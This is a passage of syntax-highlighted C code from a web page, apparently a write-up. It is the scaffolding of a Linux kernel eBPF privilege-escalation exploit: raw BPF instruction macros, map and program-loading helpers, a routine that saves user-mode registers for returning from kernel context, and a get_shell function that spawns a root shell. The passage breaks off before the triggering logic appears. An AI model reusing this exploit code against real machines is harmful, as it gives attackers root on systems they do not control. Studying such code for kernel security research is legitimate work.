class="line">357</span><br><span class="line">358</span><br><span class="line">359</span><br><span class="line">360</span><br><span class="line">361</span><br><span class="line">362</span><br><span class="line">363</span><br><span class="line">364</span><br><span class="line">365</span><br><span class="line">366</span><br><span class="line">367</span><br><span class="line">368</span><br><span class="line">369</span><br><span class="line">370</span><br><span class="line">371</span><br><span class="line">372</span><br><span class="line">373</span><br><span class="line">374</span><br><span class="line">375</span><br><span class="line">376</span><br><span class="line">377</span><br><span class="line">378</span><br><span class="line">379</span><br><span class="line">380</span><br><span class="line">381</span><br><span class="line">382</span><br><span class="line">383</span><br><span class="line">384</span><br><span class="line">385</span><br><span class="line">386</span><br><span class="line">387</span><br><span class="line">388</span><br><span class="line">389</span><br><span class="line">390</span><br><span class="line">391</span><br><span class="line">392</span><br><span class="line">393</span><br><span class="line">394</span><br><span class="line">395</span><br><span class="line">396</span><br><span class="line">397</span><br><span class="line">398</span><br><span class="line">399</span><br><span class="line">400</span><br><span class="line">401</span><br><span class="line">402</span><br><span class="line">403</span><br><span class="line">404</span><br><span class="line">405</span><br><span class="line">406</span><br><span class="line">407</span><br><span class="line">408</span><br><span class="line">409</span><br><span class="line">410</span><br><span class="line">411</span><br><span class="line">412</span><br><span class="line">413</span><br><span class="line">414</span><br><span class="line">415</span><br><span class="line">416</span><br><span class="line">417</span><br><span class="line">418</span><br><span class="line">419</span><br><span class="line">420</span><br><span class="line">421</span><br><span class="line">422</span><br><span class="line">423</span><br><span class="line">424</span><br><span class="line">425</span><br><span class="line">426</span><br><span class="line">427</span><br><span class="line">428</span><br><span class="line">429</span><br><span class="line">430</span><br><span class="line">431</span><br><span class="line">432</span><br><span class="line">433</span><br><span class="line">434</span><br><span class="line">435</span><br><span class="line">436</span><br><span class="line">437</span><br><span class="line">438</span><br><span class="line">439</span><br><span class="line">440</span><br><span class="line">441</span><br><span class="line">442</span><br><span class="line">443</span><br><span class="line">444</span><br><span class="line">445</span><br><span class="line">446</span><br><span class="line">447</span><br><span class="line">448</span><br><span class="line">449</span><br><span class="line">450</span><br><span class="line">451</span><br><span class="line">452</span><br><span class="line">453</span><br><span class="line">454</span><br><span class="line">455</span><br><span class="line">456</span><br><span class="line">457</span><br><span class="line">458</span><br><span class="line">459</span><br><span class="line">460</span><br><span class="line">461</span><br><span class="line">462</span><br><span class="line">463</span><br><span class="line">464</span><br><span class="line">465</span><br><span class="line">466</span><br><span class="line">467</span><br><span class="line">468</span><br><span class="line">469</span><br><span class="line">470</span><br><span class="line">471</span><br><span class="line">472</span><br><span class="line">473</span><br><span class="line">474</span><br><span class="line">475</span><br><span class="line">476</span><br><span class="line">477</span><br><span class="line">478</span><br><span class="line">479</span><br><span class="line">480</span><br><span class="line">481</span><br><span class="line">482</span><br><span class="line">483</span><br><span class="line">484</span><br><span class="line">485</span><br><span class="line">486</span><br><span class="line">487</span><br><span class="line">488</span><br><span class="line">489</span><br><span class="line">490</span><br><span class="line">491</span><br><span class="line">492</span><br><span class="line">493</span><br><span class="line">494</span><br><span class="line">495</span><br><span class="line">496</span><br><span class="line">497</span><br><span class="line">498</span><br><span class="line">499</span><br><span class="line">500</span><br><span class="line">501</span><br><span class="line">502</span><br><span class="line">503</span><br><span class="line">504</span><br><span class="line">505</span><br><span class="line">506</span><br><span class="line">507</span><br><span class="line">508</span><br><span class="line">509</span><br><span class="line">510</span><br><span class="line">511</span><br><span class="line">512</span><br><span class="line">513</span><br><span class="line">514</span><br><span class="line">515</span><br><span class="line">516</span><br><span class="line">517</span><br><span class="line">518</span><br><span class="line">519</span><br><span class="line">520</span><br><span class="line">521</span><br><span class="line">522</span><br><span class="line">523</span><br><span class="line">524</span><br><span class="line">525</span><br><span class="line">526</span><br><span class="line">527</span><br><span class="line">528</span><br><span class="line">529</span><br><span class="line">530</span><br><span class="line">531</span><br><span class="line">532</span><br><span class="line">533</span><br><span class="line">534</span><br><span class="line">535</span><br><span class="line">536</span><br><span class="line">537</span><br><span class="line">538</span><br><span class="line">539</span><br><span class="line">540</span><br><span class="line">541</span><br><span class="line">542</span><br><span class="line">543</span><br><span class="line">544</span><br><span class="line">545</span><br><span class="line">546</span><br><span class="line">547</span><br><span class="line">548</span><br><span class="line">549</span><br><span class="line">550</span><br><span class="line">551</span><br><span class="line">552</span><br><span class="line">553</span><br><span class="line">554</span><br><span class="line">555</span><br><span class="line">556</span><br><span class="line">557</span><br><span class="line">558</span><br><span class="line">559</span><br><span class="line">560</span><br><span class="line">561</span><br><span class="line">562</span><br><span class="line">563</span><br><span class="line">564</span><br><span class="line">565</span><br><span class="line">566</span><br><span class="line">567</span><br><span class="line">568</span><br><span class="line">569</span><br><span class="line">570</span><br><span class="line">571</span><br><span class="line">572</span><br><span class="line">573</span><br><span class="line">574</span><br><span class="line">575</span><br><span class="line">576</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> _GNU_SOURCE</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;err.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;inttypes.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sched.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;net/if.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;netinet/in.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/ipc.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/msg.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/socket.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/prctl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/userfaultfd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;pthread.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;errno.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;signal.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/syscall.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/ioctl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/sem.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;semaphore.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;poll.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;time.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/bpf_common.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/bpf.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifndef</span> _BPF_DEFS_H_</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> _BPF_DEFS_H_</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> BPF_RAW_INSN(CODE, DST, SRC, OFF, IMM) \</span></span><br><span class="line"><span class="meta">    ((struct bpf_insn)&#123;                        \</span></span><br><span class="line"><span class="meta">        .code = CODE,                          \</span></span><br><span class="line"><span class="meta">        .dst_reg = DST,                        \</span></span><br><span class="line"><span class="meta">        .src_reg = SRC,                        \</span></span><br><span class="line"><span class="meta">        .off = OFF,                            \</span></span><br><span class="line"><span class="meta">        .imm = IMM&#125;)</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> BPF_LD_IMM64_RAW(DST, SRC, IMM)              \</span></span><br><span class="line"><span class="meta">    ((struct bpf_insn)&#123;                              \</span></span><br><span class="line"><span class="meta">        .code = BPF_LD | BPF_DW | BPF_IMM,           \</span></span><br><span class="line"><span class="meta">        .dst_reg = DST,                              \</span></span><br><span class="line"><span class="meta">        .src_reg = SRC,                              \</span></span><br><span class="line"><span class="meta">        .off = 0,                                    \</span></span><br><span class="line"><span class="meta">        .imm = (__u32)(IMM)&#125;),                       \</span></span><br><span class="line"><span class="meta">        ((struct bpf_insn)&#123;                          \</span></span><br><span class="line"><span class="meta">            .code = 0, <span class="comment">/* zero is reserved opcode */</span> \</span></span><br><span class="line"><span class="meta">            .dst_reg = 0,                            \</span></span><br><span class="line"><span class="meta">            .src_reg = 0,                            \</span></span><br><span class="line"><span class="meta">            .off = 0,                                \</span></span><br><span class="line"><span class="meta">            .imm = ((__u64)(IMM)) &gt;&gt; 32&#125;)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* Memory load, dst_reg = *(uint *) (src_reg + off16) */</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> BPF_LDX_MEM(SIZE, DST, SRC, OFF)            \</span></span><br><span class="line"><span class="meta">    ((struct bpf_insn)&#123;                             \</span></span><br><span class="line"><span class="meta">        .code = BPF_LDX | BPF_SIZE(SIZE) | BPF_MEM, \</span></span><br><span class="line"><span class="meta">        .dst_reg = DST,                             \</span></span><br><span class="line"><span class="meta">        .src_reg = SRC,                             \</span></span><br><span class="line"><span class="meta">        .off = OFF,                                 \</span></span><br><span class="line"><span class="meta">        .imm = 0&#125;)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* Memory store, *(uint *) (dst_reg + off16) = src_reg */</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> BPF_STX_MEM(SIZE, DST, SRC, OFF)            \</span></span><br><span class="line"><span class="meta">    ((struct bpf_insn)&#123;                             \</span></span><br><span class="line"><span class="meta">        .code = BPF_STX | BPF_SIZE(SIZE) | BPF_MEM, \</span></span><br><span class="line"><span class="meta">        .dst_reg = DST,                             \</span></span><br><span class="line"><span class="meta">        .src_reg = SRC,                             \</span></span><br><span class="line"><span class="meta">        .off = OFF,                                 \</span></span><br><span class="line"><span class="meta">        .imm = 0&#125;)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* Conditional jumps against immediates, if (dst_reg &#x27;op&#x27; imm32) goto pc + off16 */</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> BPF_JMP_IMM(OP, DST, IMM, OFF)        \</span></span><br><span class="line"><span class="meta">    ((struct bpf_insn)&#123;                       \</span></span><br><span class="line"><span class="meta">        .code = BPF_JMP | BPF_OP(OP) | BPF_K, \</span></span><br><span class="line"><span class="meta">        .dst_reg = DST,                       \</span></span><br><span class="line"><span class="meta">        .src_reg = 0,                         \</span></span><br><span class="line"><span class="meta">        .off = OFF,                           \</span></span><br><span class="line"><span class="meta">        .imm = IMM&#125;)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* Like BPF_JMP_IMM, but with 32-bit wide operands for comparison. */</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> BPF_JMP32_IMM(OP, DST, IMM, OFF)        \</span></span><br><span class="line"><span class="meta">    ((struct bpf_insn)&#123;                         \</span></span><br><span class="line"><span class="meta">        .code = BPF_JMP32 | BPF_OP(OP) | BPF_K, \</span></span><br><span class="line"><span class="meta">        .dst_reg = DST,                         \</span></span><br><span class="line"><span class="meta">        .src_reg = 0,                           \</span></span><br><span class="line"><span class="meta">        .off = OFF,                             \</span></span><br><span class="line"><span class="meta">        .imm = IMM&#125;)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* Short form of mov, dst_reg = imm32 */</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> BPF_MOV64_IMM(DST, IMM)              \</span></span><br><span class="line"><span class="meta">    ((struct bpf_insn)&#123;                      \</span></span><br><span class="line"><span class="meta">        .code = BPF_ALU64 | BPF_MOV | BPF_K, \</span></span><br><span class="line"><span class="meta">        .dst_reg = DST,                      \</span></span><br><span class="line"><span class="meta">        .src_reg = 0,                        \</span></span><br><span class="line"><span class="meta">        .off = 0,                            \</span></span><br><span class="line"><span class="meta">        .imm = IMM&#125;)</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> BPF_MOV32_IMM(DST, IMM)            \</span></span><br><span class="line"><span class="meta">    ((struct bpf_insn)&#123;                    \</span></span><br><span class="line"><span class="meta">        .code = BPF_ALU | BPF_MOV | BPF_K, \</span></span><br><span class="line"><span class="meta">        .dst_reg = DST,                    \</span></span><br><span class="line"><span class="meta">        .src_reg = 0,                      \</span></span><br><span class="line"><span class="meta">        .off = 0,                          \</span></span><br><span class="line"><span class="meta">        .imm = IMM&#125;)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* Short form of mov, dst_reg = src_reg */</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> BPF_MOV64_REG(DST, SRC)              \</span></span><br><span class="line"><span class="meta">    ((struct bpf_insn)&#123;                      \</span></span><br><span class="line"><span class="meta">        .code = BPF_ALU64 | BPF_MOV | BPF_X, \</span></span><br><span class="line"><span class="meta">        .dst_reg = DST,                      \</span></span><br><span class="line"><span class="meta">        .src_reg = SRC,                      \</span></span><br><span class="line"><span class="meta">        .off = 0,                            \</span></span><br><span class="line"><span class="meta">        .imm = 0&#125;)</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> BPF_MOV32_REG(DST, SRC)            \</span></span><br><span class="line"><span class="meta">    ((struct bpf_insn)&#123;                    \</span></span><br><span class="line"><span class="meta">        .code = BPF_ALU | BPF_MOV | BPF_X, \</span></span><br><span class="line"><span class="meta">        .dst_reg = DST,                    \</span></span><br><span class="line"><span class="meta">        .src_reg = SRC,                    \</span></span><br><span class="line"><span class="meta">        .off = 0,                          \</span></span><br><span class="line"><span class="meta">        .imm = 0&#125;)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* ALU ops on immediates, bpf_add|sub|...: dst_reg += imm32 */</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> BPF_ALU64_IMM(OP, DST, IMM)             \</span></span><br><span class="line"><span class="meta">    ((struct bpf_insn)&#123;                         \</span></span><br><span class="line"><span class="meta">        .code = BPF_ALU64 | BPF_OP(OP) | BPF_K, \</span></span><br><span class="line"><span class="meta">        .dst_reg = DST,                         \</span></span><br><span class="line"><span class="meta">        .src_reg = 0,                           \</span></span><br><span class="line"><span class="meta">        .off = 0,                               \</span></span><br><span class="line"><span class="meta">        .imm = IMM&#125;)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* ALU ops on registers, bpf_add|sub|...: dst_reg += src_reg */</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> BPF_ALU64_REG(OP, DST, SRC)             \</span></span><br><span class="line"><span class="meta">    ((struct bpf_insn)&#123;                         \</span></span><br><span class="line"><span class="meta">        .code = BPF_ALU64 | BPF_OP(OP) | BPF_X, \</span></span><br><span class="line"><span class="meta">        .dst_reg = DST,                         \</span></span><br><span class="line"><span class="meta">        .src_reg = SRC,                         \</span></span><br><span class="line"><span class="meta">        .off = 0,                               \</span></span><br><span class="line"><span class="meta">        .imm = 0&#125;)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* Program exit */</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> BPF_EXIT_INSN()             \</span></span><br><span class="line"><span class="meta">    ((struct bpf_insn)&#123;             \</span></span><br><span class="line"><span class="meta">        .code = BPF_JMP | BPF_EXIT, \</span></span><br><span class="line"><span class="meta">        .dst_reg = 0,               \</span></span><br><span class="line"><span class="meta">        .src_reg = 0,               \</span></span><br><span class="line"><span class="meta">        .off = 0,                   \</span></span><br><span class="line"><span class="meta">        .imm = 0&#125;)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* BPF_LD_IMM64 macro encodes single &#x27;load 64-bit immediate&#x27; insn */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> BPF_LD_IMM64(DST, IMM) \</span></span><br><span class="line"><span class="meta">    BPF_LD_IMM64_RAW(DST, 0, IMM)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* pseudo BPF_LD_IMM64 insn used to refer to process-local map_fd */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> BPF_LD_MAP_FD(DST, MAP_FD) \</span></span><br><span class="line"><span class="meta">    BPF_LD_IMM64_RAW(DST, BPF_PSEUDO_MAP_FD, MAP_FD)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// varies from userspace bpf_map_info definition so need to redefine</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">bpf_map_info_kernel</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    __u32 type;</span><br><span class="line">    __u32 id;</span><br><span class="line">    __u32 key_size;</span><br><span class="line">    __u32 value_size;</span><br><span class="line">    __u32 max_entries;</span><br><span class="line">    __u32 map_flags;</span><br><span class="line">    <span class="keyword">char</span> name[BPF_OBJ_NAME_LEN];</span><br><span class="line">    __u32 ifindex;</span><br><span class="line">    __u32 btf_vmlinux_value_type_id;</span><br><span class="line">    __u64 netns_dev;</span><br><span class="line">    __u64 netns_ino;</span><br><span class="line">    __u32 btf_id;</span><br><span class="line">    __u32 btf_key_type_id;</span><br><span class="line">    __u32 btf_value_type_id;</span><br><span class="line">&#125; __attribute__((aligned(<span class="number">8</span>)));</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">bpf</span><span class="params">(<span class="keyword">int</span> cmd, <span class="keyword">union</span> bpf_attr *attrs)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> syscall(__NR_bpf, cmd, attrs, <span class="keyword">sizeof</span>(*attrs));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">create_map</span><span class="params">(<span class="keyword">union</span> bpf_attr *map_attrs)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> bpf(BPF_MAP_CREATE, map_attrs);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">update_map_element</span><span class="params">(<span class="keyword">int</span> fd, <span class="keyword">uint64_t</span> key, <span class="keyword">void</span> *value, <span class="keyword">uint64_t</span> flags)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="class"><span class="keyword">union</span> <span class="title">bpf_attr</span> <span class="title">attr</span> =</span> &#123;&#125;;</span><br><span class="line">    attr.map_fd = fd;</span><br><span class="line">    attr.key = (<span class="keyword">uint64_t</span>)&amp;key;</span><br><span class="line">    attr.value = (<span class="keyword">uint64_t</span>)value;</span><br><span class="line">    attr.flags = flags;</span><br><span class="line">    <span class="keyword">return</span> bpf(BPF_MAP_UPDATE_ELEM, &amp;attr);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">lookup_map_element</span><span class="params">(<span class="keyword">int</span> fd, <span class="keyword">uint64_t</span> key, <span class="keyword">void</span> *value)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="class"><span class="keyword">union</span> <span class="title">bpf_attr</span> <span class="title">attr</span> =</span> &#123;&#125;;</span><br><span class="line">    attr.map_fd = fd;</span><br><span class="line">    attr.key = (<span class="keyword">uint64_t</span>)&amp;key;</span><br><span class="line">    attr.value = (<span class="keyword">uint64_t</span>)value;</span><br><span class="line">    <span class="keyword">return</span> bpf(BPF_MAP_LOOKUP_ELEM, &amp;attr);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">obj_get_info_by_fd</span><span class="params">(<span class="keyword">union</span> bpf_attr *attrs)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> bpf(BPF_OBJ_GET_INFO_BY_FD, attrs);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">map_get_next_key</span><span class="params">(<span class="keyword">union</span> bpf_attr *attrs)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> bpf(BPF_MAP_GET_NEXT_KEY, attrs);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">run_bpf_prog</span><span class="params">(struct bpf_insn *insn, <span class="keyword">uint32_t</span> cnt, <span class="keyword">int</span> log_level, <span class="keyword">int</span> *prog_fd_out)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> ret = <span class="number">-1</span>;</span><br><span class="line">    <span class="keyword">int</span> prog_fd = <span class="number">-1</span>;</span><br><span class="line">    <span class="keyword">char</span> verifier_log_buff[<span class="number">0x200000</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">    <span class="keyword">int</span> socks[<span class="number">2</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">    <span class="class"><span class="keyword">union</span> <span class="title">bpf_attr</span> <span class="title">prog_attrs</span> =</span></span><br><span class="line">        &#123;</span><br><span class="line">            .prog_type = BPF_PROG_TYPE_SOCKET_FILTER,</span><br><span class="line">            .insn_cnt = cnt,</span><br><span class="line">            .insns = (<span class="keyword">uint64_t</span>)insn,</span><br><span class="line">            .license = (<span class="keyword">uint64_t</span>) <span class="string">&quot;&quot;</span>,</span><br><span class="line">            .log_level = log_level,</span><br><span class="line">            .log_size = <span class="keyword">sizeof</span>(verifier_log_buff),</span><br><span class="line">            .log_buf = (<span class="keyword">uint64_t</span>)verifier_log_buff&#125;;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="literal">NULL</span> != prog_fd_out)</span><br><span class="line">        prog_fd = *prog_fd_out;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="number">0</span> &gt;= prog_fd)</span><br><span class="line">        prog_fd = bpf(BPF_PROG_LOAD, &amp;prog_attrs);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="number">0</span> &gt; prog_fd)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">puts</span>(verifier_log_buff);</span><br><span class="line">        <span class="keyword">goto</span> done;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="number">0</span> != socketpair(AF_UNIX, SOCK_DGRAM, <span class="number">0</span>, socks))</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;dzhsb\n&quot;</span>);</span><br><span class="line">        <span class="keyword">goto</span> done;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="number">0</span> != setsockopt(socks[<span class="number">0</span>], SOL_SOCKET, SO_ATTACH_BPF, &amp;prog_fd, <span class="keyword">sizeof</span>(<span class="keyword">int</span>)))</span><br><span class="line">        <span class="keyword">goto</span> done;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="number">0x7</span> != write(socks[<span class="number">1</span>], <span class="string">&quot;zzzzzzz&quot;</span>, <span class="number">7</span>))</span><br><span class="line">        <span class="keyword">goto</span> done;</span><br><span class="line">    <span class="keyword">if</span> (log_level == <span class="number">3</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">// char *each_line_log = strtok(verifier_log_buff, &quot;\n&quot;);</span></span><br><span class="line">        <span class="comment">// printf(&quot;%s\n&quot;, each_line_log);</span></span><br><span class="line">        <span class="comment">// each_line_log = strtok(NULL, &quot;\n&quot;);</span></span><br><span class="line">        <span class="comment">// while (each_line_log)</span></span><br><span class="line">        <span class="comment">// &#123;</span></span><br><span class="line">        <span class="comment">//     int len = strlen(each_line_log);</span></span><br><span class="line">        <span class="comment">//     if (len &gt; 231)</span></span><br><span class="line">        <span class="comment">//     &#123;</span></span><br><span class="line">        <span class="comment">//         printf(&quot;%s\n&quot;, each_line_log);</span></span><br><span class="line">        <span class="comment">//         printf(&quot;%s\n&quot;, (each_line_log + 231));</span></span><br><span class="line">        <span class="comment">//         each_line_log = strtok(NULL, &quot;\n&quot;);</span></span><br><span class="line">        <span class="comment">//         continue;</span></span><br><span class="line">        <span class="comment">//     &#125;</span></span><br><span class="line">        <span class="comment">//     printf(&quot;%s\n&quot;, each_line_log);</span></span><br><span class="line">        <span class="comment">//     each_line_log = strtok(NULL, &quot;\n&quot;);</span></span><br><span class="line">        <span class="comment">// &#125;</span></span><br><span class="line">        <span class="built_in">puts</span>(verifier_log_buff);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="literal">NULL</span> != prog_fd_out)</span><br><span class="line">        *prog_fd_out = prog_fd;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        close(prog_fd);</span><br><span class="line"></span><br><span class="line">    ret = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">done:</span><br><span class="line">    close(socks[<span class="number">0</span>]);</span><br><span class="line">    close(socks[<span class="number">1</span>]);</span><br><span class="line">    <span class="keyword">return</span> ret;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">size_t</span> user_cs, user_ss, user_sp, user_rflags;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">save_status</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    __asm__(</span><br><span class="line">        <span class="string">&quot;mov user_cs, cs;&quot;</span></span><br><span class="line">        <span class="string">&quot;mov user_ss, ss;&quot;</span></span><br><span class="line">        <span class="string">&quot;mov user_sp, rsp;&quot;</span></span><br><span class="line">        <span class="string">&quot;pushf;&quot;</span></span><br><span class="line">        <span class="string">&quot;pop user_rflags;&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*]status has been saved.&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">err_exit</span><span class="params">(<span class="keyword">char</span> *err_msg)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">puts</span>(err_msg);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">get_shell</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (getuid())</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;\033[31m\033[1m[x] Failed to get the root!\033[0m\n&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[32m\033[1m[+] Successful to get the root. Execve root shell now...\033[0m\n&quot;</span>);</span><br><span class="line">    system(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">print_hex</span><span class="params">(<span class="keyword">char</span> *buf, <span class="keyword">int</span> size)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> i;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;======================================&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;data :\n&quot;</span>);</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; (size / <span class="number">8</span>); i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> (i % <span class="number">2</span> == <span class="number">0</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span> (i / 